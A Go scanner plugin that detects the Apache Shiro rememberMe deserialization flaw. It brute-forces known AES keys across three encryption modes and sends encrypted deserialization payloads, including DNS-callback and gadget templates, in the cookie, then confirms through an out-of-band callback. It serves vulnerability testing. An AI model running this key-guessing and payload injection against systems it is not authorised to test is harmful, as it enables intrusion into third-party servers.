/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package shiro

import (
	"context"
	"encoding/base64"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/reverse"
	"wscan/core/utils/checker"
	logger "wscan/core/utils/log"
)

type deserialiazation struct {
	filter     *checker.URLChecker
	cookieName string
}

func (p *deserialiazation) Finger() *base.Finger {
	return &base.Finger{
		CheckAction: func(ctx context.Context, a *base.Apollo) error {
			flow := a.GetTargetFlow()
			logger.Debugf("Start detection shiro/rememberme-deserialization, %s", flow.Request.URL().String())

			cookieName := "rememberMe"
			if p.cookieName != "" {
				cookieName = p.cookieName
			}

			// Step 1: 确认目标使用 Shiro 框架
			req, _ := http.NewRequest("GET", flow.Request.URL().String(), nil)
			req.SetHeader("Cookie", cookieName+"=1")
			res, err := a.HTTPClient.Respond(ctx, req)
			if err != nil {
				logger.Error(err)
				return nil
			}
			if !containsDeleteMeInCookies(res.Header["Set-Cookie"], cookieName) {
				return nil
			}

			logger.Debugf("Confirmed Shiro framework, starting deserialization detection, %s", flow.Request.URL().String())

			// Step 2: 使用反连平台进行反序列化验证
			unit := a.Reverse.Register(nil)

			// 构造 DNS 回连域名
			domainInfo, err := unit.GetQueryDomain()
			callbackDomain := ""
			if err == nil && domainInfo != nil && domainInfo.Domain != "" {
				callbackDomain = domainInfo.Domain
			}

			// 遍历已知 key，对每个 key 尝试加密和发送
			for _, shiroKey := range ShiroKeys {
				keyDecrypt, _ := base64.StdEncoding.DecodeString(shiroKey)

				// Step 2a: 先验证 key 是否有效（使用 CheckContent + deleteMe 响应）
				// 尝试三种加密模式：CBC-零IV、CBC-随机IV、GCM
				var validKey bool
				var encryptMode string

				// 模式1: CBC-零IV (Shiro 默认模式)
				rememberMe, err := AESCBCEncryptZeroIV(keyDecrypt, content())
				if err == nil {
					validKey, _ = checkKeyValid(ctx, a, flow.Request.URL().String(), cookieName, rememberMe)
					if validKey {
						encryptMode = "CBC-零IV"
					}
				}

				// 模式2: CBC-随机IV
				if !validKey {
					rememberMe, err = AESCBCEncrypt(keyDecrypt, content())
					if err == nil {
						validKey, _ = checkKeyValid(ctx, a, flow.Request.URL().String(), cookieName, rememberMe)
						if validKey {
							encryptMode = "CBC-随机IV"
						}
					}
				}

				// 模式3: GCM (Shiro 1.4.2+)
				if !validKey {
					rememberMe, err = AESGCMEncrypt(keyDecrypt, content())
					if err == nil {
						validKey, _ = checkKeyValid(ctx, a, flow.Request.URL().String(), cookieName, rememberMe)
						if validKey {
							encryptMode = "GCM"
						}
					}
				}

				if !validKey {
					continue
				}

				logger.Debugf("Found valid Shiro key %s with mode %s, attempting deserialization callback", shiroKey, encryptMode)

				// Step 2b: key 有效，尝试反连验证
				var deserPayload []byte

				// 优先使用 DNS 回连 payload（HashMap<URL,Integer> 方式）
				if callbackDomain != "" {
					deserPayload = buildShiroDNSPayload(callbackDomain)
				}

				// Fallback: 使用 CheckContent 做轻量验证
				if len(deserPayload) == 0 {
					// 尝试 gadget 模板
					visitURL := unit.GetVisitURL()
					for _, tmpl := range gadgetTemplates {
						payload := tmpl.ReplaceCallbackURL(visitURL)
						if payload != "" {
							deserPayload = []byte(payload)
							break
						}
					}
				}

				// 最终 fallback: 使用原始 CheckContent
				if len(deserPayload) == 0 {
					c, _ := base64.StdEncoding.DecodeString(CheckContent)
					deserPayload = c
				}

				// 使用相同的加密模式加密 payload
				var deserRememberMe string
				switch encryptMode {
				case "CBC-零IV":
					deserRememberMe, err = AESCBCEncryptZeroIV(keyDecrypt, deserPayload)
				case "GCM":
					deserRememberMe, err = AESGCMEncrypt(keyDecrypt, deserPayload)
				default: // CBC-随机IV
					deserRememberMe, err = AESCBCEncrypt(keyDecrypt, deserPayload)
				}
				if err != nil {
					continue
				}

				deserReq, _ := http.NewRequest("GET", flow.Request.URL().String(), nil)
				deserReq.SetHeader("Cookie", "JSESSIONID="+Randcase(8)+";"+cookieName+"="+deserRememberMe)

				deserRes, err := a.HTTPClient.Respond(ctx, deserReq)
				if err != nil {
					continue
				}

				// 通过反连平台检查是否收到回连
				unit.OnVisit(func(event *reverse.Event) error {
					v := a.NewWebVuln(deserReq, deserRes, nil)
					if v != nil {
						v.SetTargetURL(flow.Request.URL())
						v.Payload = shiroKey
						v.Add("encrypt_mode", encryptMode)
						a.OutputVuln(v)
					}
					return nil
				})
				// 等待 3 秒让反连事件到达
				unit.Fetch(3000)

				// D1-04: 不再在第一个有效 key 后 return nil
				// 继续尝试所有有效 key，提高检测覆盖率
			}

			return nil
		},
		Channel:     "web-path",
		NeedReverse: true,
		RelyOn:      &model.VulnBinding{ID: "shiro/shiro/default-key"},
		Binding: &model.VulnBinding{
			ID:       "shiro/shiro/rememberme-deserialization",
			Plugin:   "shiro/shiro/rememberme-deserialization",
			Category: "shiro/shiro/rememberme-deserialization",
			Severity: model.SeverityCritical,
		},
	}
}

// content returns the decoded CheckContent bytes
func content() []byte {
	c, _ := base64.StdEncoding.DecodeString(CheckContent)
	return c
}

// checkKeyValid checks if a Shiro key is valid by sending an encrypted cookie
// and checking if the server returns deleteMe
func checkKeyValid(ctx context.Context, a *base.Apollo, urlStr, cookieName, rememberMe string) (bool, error) {
	req, _ := http.NewRequest("GET", urlStr, nil)
	req.SetHeader("Cookie", "JSESSIONID="+Randcase(8)+";"+cookieName+"="+rememberMe)
	res, err := a.HTTPClient.Respond(ctx, req)
	if err != nil {
		return false, err
	}
	// 如果返回了 deleteMe，说明 key 不正确
	if containsDeleteMeInCookies(res.Header["Set-Cookie"], cookieName) {
		return false, nil
	}
	return true, nil
}

// buildDeserializationPayload 构造包含反连 URL 的反序列化 payload
// D1-01: 重写此函数，嵌入真正的反连验证标记
func buildDeserializationPayload(callbackURL string) string {
	// 提取域名用于 DNS 回连
	domain := extractDomain(callbackURL)
	if domain != "" {
		// 使用 HashMap<URL, Integer> 方式构造 DNS 回连 payload
		// 这是最可靠的方式，因为只依赖 JDK 类
		payload := buildShiroDNSPayload(domain)
		if len(payload) > 0 {
			return string(payload)
		}
	}

	// 尝试 gadget 模板
	for _, tmpl := range gadgetTemplates {
		payload := tmpl.ReplaceCallbackURL(callbackURL)
		if payload != "" {
			return payload
		}
	}

	// fallback: 使用 CheckContent 做轻量验证
	content, err := base64.StdEncoding.DecodeString(CheckContent)
	if err != nil {
		return ""
	}
	return string(content)
}
